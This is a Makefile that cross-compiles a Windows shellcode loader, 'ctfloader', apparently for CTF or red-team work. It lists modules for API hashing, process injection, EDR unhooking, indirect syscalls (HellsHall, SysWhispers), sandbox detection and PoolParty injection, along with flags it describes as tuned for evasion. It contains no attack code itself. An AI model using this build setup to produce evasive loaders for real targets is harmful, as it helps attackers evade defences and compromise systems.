###############################################################################
# Makefile for Clang (MinGW) cross-compiling from Linux
# Targets: Debian / Ubuntu / Kali Linux (mingw-w64 + clang + lld + nasm)
# DO NOT MODIFY THIS FILE UNLESS YOU KNOW WHAT YOU ARE DOING
###############################################################################

# ───────────────────────────────────────────────────────────────────────────────
# 1. Toolchain – Clang/LLD cross‑targeting MinGW‑w64
# ───────────────────────────────────────────────────────────────────────────────
.SUFFIXES:

TARGET_TRIPLE ?= x86_64-w64-mingw32
CLANG         ?= clang --target=$(TARGET_TRIPLE) -fuse-ld=lld

# Parallel jobs — use all available cores (override with: make JOBS=N)
JOBS ?= $(shell nproc 2>/dev/null || echo 4)
MAKEFLAGS += -j$(JOBS)

# ── Sysroot paths (standard Debian/Ubuntu/Kali layout) ───────────────────────
MINGW_SYSROOT  := /usr/$(TARGET_TRIPLE)
INCLUDE_DIR    := $(MINGW_SYSROOT)/include
MINGW_LIB_DIR  := $(MINGW_SYSROOT)/lib
INCLUDE        := -I$(INCLUDE_DIR)

# GCC runtime libs (libgcc.a, libmingwex.a …).
# Auto-detect the win32 subtree; fall back to MINGW_LIB_DIR if GCC is absent
# (e.g. llvm-mingw-only setups).
GCC_WIN32_PATH := $(shell find /usr/lib/gcc/$(TARGET_TRIPLE)/ -type d -name "*win32" 2>/dev/null | head -n1)
ifeq ($(GCC_WIN32_PATH),)
    GCC_WIN32_PATH := $(MINGW_LIB_DIR)
endif

# Both paths needed: GCC runtime + mingw-w64 import stubs (winhttp, ntdll …)
LIBPATH := -L$(GCC_WIN32_PATH) -L$(MINGW_LIB_DIR)

# ───────────────────────────────────────────────────────────────────────────────
# 2. Build format selector (EXE is default)
# ───────────────────────────────────────────────────────────────────────────────
FORMAT ?= EXE                  # { EXE | DLL }

# ───────────────────────────────────────────────────────────────────────────────
# 3. Source files
# ───────────────────────────────────────────────────────────────────────────────
COMMON_SRCS := \
	api_hashing.c  \
	inject.c       \
	unhook.c       \
	hellhall.c     \
	sandbox.c      \
	trampoline.c   \
	poolparty.c    \
	timerqueue.c

ifeq ($(FORMAT),DLL)
	MAIN_SRC := main_dll.c
	TARGET   := ctfloader.dll
else
	MAIN_SRC := main.c
	TARGET   := ctfloader.exe
endif

C_SRCS := $(COMMON_SRCS) $(MAIN_SRC)
C_OBJS := $(C_SRCS:.c=.o)

# ───────────────────────────────────────────────────────────────────────────────
# 4. Assembly helper (Whispers)
# ───────────────────────────────────────────────────────────────────────────────
ASM_SRC := whispers-asm.x64.asm
ASM_OBJ := whispers-asm.o
ASFLAGS := -f win64

# ───────────────────────────────────────────────────────────────────────────────
# 5. Flags
# ───────────────────────────────────────────────────────────────────────────────
# ───────────────────────────────────────────────────────────────────────────────
# 5. Flags (mirror original baseline)
# ───────────────────────────────────────────────────────────────────────────────
# Baseline flags from the original CTFPacker Makefile:
#   -O0 -Wall -w -fms-extensions -fdeclspec -static
# We keep them intact so behaviour matches the pre‑DLL build.
# Hardening flags for evasion and binary optimization
HARDENING_FLAGS := -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables \
                   -ffunction-sections -fdata-sections -Wl,--gc-sections

CFLAGS_BASE  := -O0 -Wall -w -fms-extensions -fdeclspec -static -D_WIN32_WINNT=0x0602 $(HARDENING_FLAGS)
LDFLAGS_BASE := -Wl,--disable-auto-import -s -Wl,--no-seh -mwindows
LIBS         := -lwinhttp -lntdll

ifeq ($(FORMAT),DLL)
	# DLL build: drop static CRT + create import‑lib
	CFLAGS  := $(filter-out -static,$(CFLAGS_BASE)) -DCTF_AS_DLL
	LDFLAGS := $(LDFLAGS_BASE) -shared -Wl,--out-implib,libctfloader.a
else
	CFLAGS  := $(CFLAGS_BASE)
	LDFLAGS := $(LDFLAGS_BASE)
endif

# ───────────────────────────────────────────────────────────────────────────────
# 6. Phony targets
# ───────────────────────────────────────────────────────────────────────────────
.PHONY: all exe dll clean check

all: $(TARGET)

exe:
	$(MAKE) FORMAT=EXE JOBS=$(JOBS)

dll:
	$(MAKE) FORMAT=DLL JOBS=$(JOBS)

# ── Toolchain sanity check ────────────────────────────────────────────────────
check:
	@echo "[*] Checking required tools..."
	@command -v clang   >/dev/null 2>&1 || { echo "[-] clang not found";   exit 1; }
	@command -v lld     >/dev/null 2>&1 || { echo "[-] lld not found";     exit 1; }
	@command -v nasm    >/dev/null 2>&1 || { echo "[-] nasm not found";    exit 1; }
	@command -v make    >/dev/null 2>&1 || { echo "[-] make not found";    exit 1; }
	@test -d "$(INCLUDE_DIR)"    || { echo "[-] MinGW includes missing: $(INCLUDE_DIR)";  exit 1; }
	@test -d "$(MINGW_LIB_DIR)" || { echo "[-] MinGW libs missing: $(MINGW_LIB_DIR)";    exit 1; }
	@echo "[+] All tools OK (jobs=$(JOBS))"

# ───────────────────────────────────────────────────────────────────────────────
# 7. Linking & compilation rules
# ───────────────────────────────────────────────────────────────────────────────
$(TARGET): $(C_OBJS) $(ASM_OBJ)
	$(CLANG) $(CFLAGS) $(LIBPATH) $^ $(LDFLAGS) $(LIBS) -o $@

%.o: %.c
	$(CLANG) $(CFLAGS) $(INCLUDE) -c $< -o $@

$(ASM_OBJ): $(ASM_SRC)
	nasm $(ASFLAGS) $< -o $@

# ───────────────────────────────────────────────────────────────────────────────
# 8. House‑keeping
# ───────────────────────────────────────────────────────────────────────────────
clean:
	rm -f $(C_OBJS) $(ASM_OBJ) $(TARGET) libctfloader.a
